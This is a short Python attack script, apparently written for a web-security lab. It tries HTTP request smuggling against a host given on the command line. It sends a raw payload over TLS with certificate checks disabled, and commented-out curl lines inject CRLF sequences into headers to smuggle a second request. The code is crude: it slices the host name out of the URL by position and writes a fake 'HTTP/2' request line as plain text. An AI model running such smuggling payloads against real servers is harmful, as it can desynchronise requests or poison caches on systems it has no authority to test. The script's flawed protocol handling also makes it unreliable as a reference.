import re
import os
import sys
import requests

print("Wait 30-120sek")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 script.py <url>")
        sys.exit(1)

burp_url = sys.argv[1]
host = burp_url[8:]

session = requests.Session()


#for _ in range(180):
#os.system(f"curl -q -H 'Host: {burp_url[8:]}' -H 'Content-Length: 0' -H 'foo: bar\r\n\r\nGET /zxczxcxzc HTTP/1.1\r\nHost: {burp_url[8:]}\r\n\r\n'  {burp_url} > /dev/null 2>&1")
#os.system(f"curl --http2 -X GET -q -k -H 'Host: {burp_url[8:]}' -H 'Content-Length: 0' --data-binary 'foo: bar\x0d\x0aGET /zxczxcxzc HTTP/1.1\x0d\x0aHost: {burp_url[8:]}'  {burp_url} -x http://127.0.0.1:8080")
import socket
import ssl

port = 443

context = ssl.create_default_context()
context.check_hostname = False
context.verify_mode = ssl.CERT_NONE

sock = socket.create_connection((host, port))
s = context.wrap_socket(sock, server_hostname=host)

payload = b"GET / HTTP/2\r\nHost: " + host.encode() + b"\r\nfoo: bar\r\n\r\nGET /xxxx HTTP/1.1\r\nHost: " + host.encode()
print(payload)

# Wysłanie żądania
s.sendall(payload)

# Odbieranie i wyświetlanie odpowiedzi
print(s.recv(4096).decode())
s.close()
